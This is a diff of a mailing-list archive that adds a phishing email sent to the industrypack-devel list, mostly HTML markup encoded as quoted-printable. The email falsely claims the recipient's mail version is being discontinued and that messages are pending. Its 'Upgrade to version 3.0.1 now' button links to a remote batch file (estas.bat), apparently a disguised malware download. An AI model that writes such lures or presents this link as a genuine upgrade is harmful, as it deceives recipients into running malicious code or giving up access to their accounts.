+HT: 400; COLOR: rgb(33,33,33); OUTLINE-WIDTH: medium; FONT-STYLE: norm=
+al; OUTLINE-STYLE: none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; OUTLINE-COLOR: invert; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(24=
+3,243,243); font-variant-ligatures: normal; font-variant-caps: normal;=
+ -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; t=
+ext-decoration-style: initial; text-decoration-color: initial" cellSpa=
+cing=3D0 cellPadding=3D0 width=3D"40%" bgColor=3D#f3f3f3 border=3D1><t=
+body id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-20416174114347=
+56832m_4949633165068077493m_-5396927788566179137m_8764997356839036012m=
+_-6668086669148576920m_8264483903862251771m_-3599110451679289427m_-394=
+8985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5301 sty=
+le=3D"WIDTH: 486px; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLIN=
+E-COLOR: invert"> <TR id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67=
+m_-2041617411434756832m_4949633165068077493m_-5396927788566179137m_876=
+4997356839036012m_-6668086669148576920m_8264483903862251771m_-35991104=
+51679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_15179=
+36570293_5302 style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUT=
+LINE-COLOR: invert"> <TD id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753=
+d67m_-2041617411434756832m_4949633165068077493m_-5396927788566179137m_=
+8764997356839036012m_-6668086669148576920m_8264483903862251771m_-35991=
+10451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_15=
+17936570293_5303 style=3D"FONT-FAMILY: arial, sans-serif; OUTLINE-WIDT=
+H: medium; OUTLINE-STYLE: none; MARGIN: 0px; OUTLINE-COLOR: invert" vA=
+lign=3Dtop align=3Dcenter><table id=3Dv1gmail-ydpa8fd0474yiv1900260976=
+ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-5396927788566=
+179137m_8764997356839036012m_-6668086669148576920m_8264483903862251771=
+m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_1=
+6_0_1_1517936570293_5304 class=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3=
+753d67m_-2041617411434756832m_4949633165068077493m_-539692778856617913=
+7m_8764997356839036012m_-6668086669148576920m_8264483903862251771m_-35=
+99110451679289427m_-3948985065995513821gmail-yiv9744637941yahoo-compos=
+e-table-card style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTL=
+INE-COLOR: invert" cellSpacing=3D0 cellPadding=3D0 width=3D486 bgColor=
+=3D#ffffff border=3D0><tbody id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa=
+3753d67m_-2041617411434756832m_4949633165068077493m_-53969277885661791=
+37m_8764997356839036012m_-6668086669148576920m_8264483903862251771m_-3=
+599110451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_=
+1_1517936570293_5305 style=3D"WIDTH: 486px; OUTLINE-WIDTH: medium; OUT=
+LINE-STYLE: none; OUTLINE-COLOR: invert"> <TR id=3Dv1gmail-ydpa8fd0474=
+yiv1900260976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-=
+5396927788566179137m_8764997356839036012m_-6668086669148576920m_826448=
+3903862251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744=
+637941yui_3_16_0_1_1517936570293_5306 style=3D"OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none; OUTLINE-COLOR: invert"> <TD id=3Dv1gmail-ydpa8fd0=
+474yiv1900260976ydpa3753d67m_-2041617411434756832m_4949633165068077493=
+m_-5396927788566179137m_8764997356839036012m_-6668086669148576920m_826=
+4483903862251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9=
+744637941yui_3_16_0_1_1517936570293_5307 style=3D"FONT-FAMILY: Roboto,=
+ RobotoDraft, Helvetica, Arial, sans-serif; BORDER-BOTTOM: rgb(232,232=
+,232) 1px solid; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; BORDER-LE=
+FT: rgb(232,232,232) 1px solid; MARGIN: 0px; OUTLINE-COLOR: invert" vA=
+lign=3Dtop><table id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2=
+041617411434756832m_4949633165068077493m_-5396927788566179137m_8764997=
+356839036012m_-6668086669148576920m_8264483903862251771m_-359911045167=
+9289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_151793657=
+0293_5308 class=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-204161=
+7411434756832m_4949633165068077493m_-5396927788566179137m_876499735683=
+9036012m_-6668086669148576920m_8264483903862251771m_-35991104516792894=
+27m_-3948985065995513821gmail-yiv9744637941yahoo-compose-table-card st=
+yle=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: inve=
+rt" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody i=
+d=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m=
+_4949633165068077493m_-5396927788566179137m_8764997356839036012m_-6668=
+086669148576920m_8264483903862251771m_-3599110451679289427m_-394898506=
+5995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5309 style=3D"=
+WIDTH: 485px; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLO=
+R: invert"> <TR id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-204=
+1617411434756832m_4949633165068077493m_-5396927788566179137m_876499735=
+6839036012m_-6668086669148576920m_8264483903862251771m_-35991104516792=
+89427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_15179365702=
+93_5310 style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-C=
+OLOR: invert"> <TD id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-=
+2041617411434756832m_4949633165068077493m_-5396927788566179137m_876499=
+7356839036012m_-6668086669148576920m_8264483903862251771m_-35991104516=
+79289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_15179365=
+70293_5311 style=3D"OUTLINE-WIDTH: medium; PADDING-TOP: 17px; OUTLINE-=
+STYLE: none; PADDING-LEFT: 20px; MARGIN: 0px; OUTLINE-COLOR: invert; P=
+ADDING-RIGHT: 20px" vAlign=3Dtop><table id=3Dv1gmail-ydpa8fd0474yiv190=
+0260976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-539692=
+7788566179137m_8764997356839036012m_-6668086669148576920m_826448390386=
+2251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941=
+yui_3_16_0_1_1517936570293_5312 class=3Dv1gmail-ydpa8fd0474yiv19002609=
+76ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-53969277885=
+66179137m_8764997356839036012m_-6668086669148576920m_82644839038622517=
+71m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941yahoo=
+-compose-table-card style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: non=
+e; OUTLINE-COLOR: invert" cellSpacing=3D0 cellPadding=3D0 width=3D"100=
+%" border=3D0><tbody id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m=
+_-2041617411434756832m_4949633165068077493m_-5396927788566179137m_8764=
+997356839036012m_-6668086669148576920m_8264483903862251771m_-359911045=
+1679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_151793=
+6570293_5313 style=3D"WIDTH: 445px; OUTLINE-WIDTH: medium; OUTLINE-STY=
+LE: none; OUTLINE-COLOR: invert"> <TR id=3Dv1gmail-ydpa8fd0474yiv19002=
+60976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-53969277=
+88566179137m_8764997356839036012m_-6668086669148576920m_82644839038622=
+51771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941yu=
+i_3_16_0_1_1517936570293_5314 style=3D"OUTLINE-WIDTH: medium; OUTLINE-=
+STYLE: none; OUTLINE-COLOR: invert"> <TD id=3Dv1gmail-ydpa8fd0474yiv19=
+00260976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-53969=
+27788566179137m_8764997356839036012m_-6668086669148576920m_82644839038=
+62251771m_-3599110451679289427m_-3948985065995513821gmail-yiv974463794=
+1yui_3_16_0_1_1517936570293_5315 style=3D"FONT-SIZE: 12px; FONT-FAMILY=
+: Arial; COLOR: rgb(51,51,51); OUTLINE-WIDTH: medium; PADDING-BOTTOM: =
+11px; OUTLINE-STYLE: none; MARGIN: 0px; OUTLINE-COLOR: invert"> <DIV i=
+d=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m=
+_4949633165068077493m_-5396927788566179137m_8764997356839036012m_-6668=
+086669148576920m_8264483903862251771m_-3599110451679289427m_-394898506=
+5995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5316 style=3D"=
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert">Dea=
+r&nbsp;<STRONG style=3D'FONT-FAMILY: "Noto Sans", sans-serif; COLOR: r=
+gb(34,34,34); BACKGROUND-COLOR: rgb(243,243,243); border-radius: 0px'>=
+ <FONT style=3D"border-radius: 0px" face=3DArial><B style=3D'FONT-FAMI=
+LY: "Noto Sans", sans-serif; border-radius: 0px'><FONT style=3D"border=
+-radius: 0px" face=3D"arial, sans-serif"><STRONG style=3D'FONT-FAMILY:=
+ "Noto Sans", sans-serif; border-radius: 0px'><FONT style=3D"border-ra=
+dius: 0px" face=3DArial>industrypack-devel@lists.sourceforge.net</FONT=
+></STRONG></FONT></B></FONT></STRONG><SPAN style=3D"BACKGROUND-COLOR: =
+rgb(243,243,243)">,</SPAN></DIV> <DIV id=3Dv1gmail-ydpa8fd0474yiv19002=
+60976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-53969277=
+88566179137m_8764997356839036012m_-6668086669148576920m_82644839038622=
+51771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941yu=
+i_3_16_0_1_1517936570293_5316 style=3D"OUTLINE-WIDTH: medium; OUTLINE-=
+STYLE: none; OUTLINE-COLOR: invert"><BR id=3Dv1gmail-ydpa8fd0474yiv190=
+0260976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-539692=
+7788566179137m_8764997356839036012m_-6668086669148576920m_826448390386=
+2251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941=
+yui_3_16_0_1_1517936570293_5318 style=3D"OUTLINE-WIDTH: medium; OUTLIN=
+E-STYLE: none; OUTLINE-COLOR: invert" clear=3Dnone> You have 5 New pen=
+ding mails. Your mail version 2.0.1 is currently being discontinued fr=
+om receiving incoming mails, and will no longer work as of 10/29/2024.=
+</DIV> <DIV id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617=
+411434756832m_4949633165068077493m_-5396927788566179137m_8764997356839=
+036012m_-6668086669148576920m_8264483903862251771m_-359911045167928942=
+7m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5=
+319 style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR=
+: invert">&nbsp;</DIV> <DIV id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3=
+753d67m_-2041617411434756832m_4949633165068077493m_-539692778856617913=
+7m_8764997356839036012m_-6668086669148576920m_8264483903862251771m_-35=
+99110451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1=
+_1517936570293_5320 style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: non=
+e; OUTLINE-COLOR: invert">To retrieve your messages and upgrade to ver=
+sion 3.0.1, kindly follow the upgrade information below:<BR id=3Dv1gma=
+il-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_49496331=
+65068077493m_-5396927788566179137m_8764997356839036012m_-6668086669148=
+576920m_8264483903862251771m_-3599110451679289427m_-394898506599551382=
+1gmail-yiv9744637941yui_3_16_0_1_1517936570293_5321 style=3D"OUTLINE-W=
+IDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" clear=3Dnone=
+>&nbsp;</DIV><table id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_=
+-2041617411434756832m_4949633165068077493m_-5396927788566179137m_87649=
+97356839036012m_-6668086669148576920m_8264483903862251771m_-3599110451=
+679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936=
+570293_5322 class=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041=
+617411434756832m_4949633165068077493m_-5396927788566179137m_8764997356=
+839036012m_-6668086669148576920m_8264483903862251771m_-359911045167928=
+9427m_-3948985065995513821gmail-yiv9744637941yahoo-compose-table-card =
+style=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: in=
+vert" cellSpacing=3D0 border=3D0><tbody id=3Dv1gmail-ydpa8fd0474yiv190=
+0260976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-539692=
+7788566179137m_8764997356839036012m_-6668086669148576920m_826448390386=
+2251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941=
+yui_3_16_0_1_1517936570293_5323 style=3D"WIDTH: 169px; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert"> <TR id=3Dv1gmail-=
+ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_49496331650=
+68077493m_-5396927788566179137m_8764997356839036012m_-6668086669148576=
+920m_8264483903862251771m_-3599110451679289427m_-3948985065995513821gm=
+ail-yiv9744637941yui_3_16_0_1_1517936570293_5324 style=3D"OUTLINE-WIDT=
+H: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert"> <TD id=3Dv1gma=
+il-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_49496331=
+65068077493m_-5396927788566179137m_8764997356839036012m_-6668086669148=
+576920m_8264483903862251771m_-3599110451679289427m_-394898506599551382=
+1gmail-yiv9744637941yui_3_16_0_1_1517936570293_5325 style=3D"FONT-FAMI=
+LY: arial, sans-serif; MIN-WIDTH: 50px; OUTLINE-WIDTH: medium; PADDING=
+-BOTTOM: 5px; PADDING-TOP: 5px; OUTLINE-STYLE: none; PADDING-LEFT: 20p=
+x; MARGIN: 0px; OUTLINE-COLOR: invert; PADDING-RIGHT: 20px; BACKGROUND=
+-COLOR: rgb(38,114,236)" bgColor=3D#2672ec><FONT id=3Dv1gmail-ydpa8fd0=
+474yiv1900260976ydpa3753d67m_-2041617411434756832m_4949633165068077493=
+m_-5396927788566179137m_8764997356839036012m_-6668086669148576920m_826=
+4483903862251771m_-3599110451679289427m_-3948985065995513821gmail-yiv9=
+744637941yui_3_16_0_1_1517936570293_5326 style=3D"FONT-FAMILY: Calibri=
+, serif, EmojiFont; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLIN=
+E-COLOR: invert"><A id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_=
+-2041617411434756832m_4949633165068077493m_-5396927788566179137m_87649=
+97356839036012m_-6668086669148576920m_8264483903862251771m_-3599110451=
+679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936=
+570293_5327 style=3D"FONT-WEIGHT: 600; COLOR: rgb(255,255,255); OUTLIN=
+E-WIDTH: medium; TEXT-ALIGN: center; OUTLINE-STYLE: none; LETTER-SPACI=
+NG: 0.02em; OUTLINE-COLOR: invert" href=3D"https://demawoodworkdemawoo=
+dwork.standard.us-east-1.oortech.com/estas.bat#industrypack-devel@list=
+s.sourceforge.net" shape=3Drect rel=3Dnoreferrer target=3D_blank>Upgra=
+de to version 3.0.1 now</A></FONT></TD></TR></TBODY></TABLE> <DIV id=3D=
+v1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_494=
+9633165068077493m_-5396927788566179137m_8764997356839036012m_-66680866=
+69148576920m_8264483903862251771m_-3599110451679289427m_-3948985065995=
+513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5328 style=3D"FONT=
+-FAMILY: Arial, serif, EmojiFont; OUTLINE-WIDTH: medium; OUTLINE-STYLE=
+: none; OUTLINE-COLOR: invert"><SPAN id=3Dv1gmail-ydpa8fd0474yiv190026=
+0976ydpa3753d67m_-2041617411434756832m_4949633165068077493m_-539692778=
+8566179137m_8764997356839036012m_-6668086669148576920m_826448390386225=
+1771m_-3599110451679289427m_-3948985065995513821gmail-yiv9744637941yui=
+_3_16_0_1_1517936570293_5329 style=3D"OUTLINE-WIDTH: medium; OUTLINE-S=
+TYLE: none; OUTLINE-COLOR: invert; BACKGROUND-COLOR: rgb(243,243,243)"=
+></SPAN>&nbsp;</DIV> <DIV id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa375=
+3d67m_-2041617411434756832m_4949633165068077493m_-5396927788566179137m=
+_8764997356839036012m_-6668086669148576920m_8264483903862251771m_-3599=
+110451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_1=
+517936570293_5330 style=3D"FONT-FAMILY: Arial, serif, EmojiFont; OUTLI=
+NE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert">Email Se=
+rvice Team.</DIV> <DIV id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d6=
+7m_-2041617411434756832m_4949633165068077493m_-5396927788566179137m_87=
+64997356839036012m_-6668086669148576920m_8264483903862251771m_-3599110=
+451679289427m_-3948985065995513821gmail-yiv9744637941yui_3_16_0_1_1517=
+936570293_5330 style=3D"FONT-FAMILY: Arial, serif, EmojiFont; OUTLINE-=
+WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert"><BR></DIV> =
+<DIV id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-20416174114347=
+56832m_4949633165068077493m_-5396927788566179137m_8764997356839036012m=
+_-6668086669148576920m_8264483903862251771m_-3599110451679289427m_-394=
+8985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5330 sty=
+le=3D"FONT-FAMILY: Arial, serif, EmojiFont; OUTLINE-WIDTH: medium; OUT=
+LINE-STYLE: none; OUTLINE-COLOR: invert"><B style=3D'FONT-FAMILY: "Not=
+o Sans", sans-serif; COLOR: rgb(34,34,34); border-radius: 0px'><FONT s=
+tyle=3D"border-radius: 0px" face=3D"arial, sans-serif">industrypack-de=
+vel@lists.sourceforge.net &nbsp;2024.</FONT></B><BR> </DIV> <DIV id=3D=
+v1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_494=
+9633165068077493m_-5396927788566179137m_8764997356839036012m_-66680866=
+69148576920m_8264483903862251771m_-3599110451679289427m_-3948985065995=
+513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5331 style=3D"OUTL=
+INE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" dir=3Dl=
+tr><BR id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-204161741143=
+4756832m_4949633165068077493m_-5396927788566179137m_876499735683903601=
+2m_-6668086669148576920m_8264483903862251771m_-3599110451679289427m_-3=
+948985065995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5332 s=
+tyle=3D"OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR: inv=
+ert" clear=3Dnone></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></=
+TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P></body>
+</html>
+
+--GUHXNQerZ2YSBzH3oSb=_OTL34oM8hnXJ8--
+
+
+
+--===============0792123753160614522==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============7381838886445254578==
+--===============0792123753160614522==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -262,5 +416,6 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============7381838886445254578==--
+--===============0792123753160614522==--
+
 
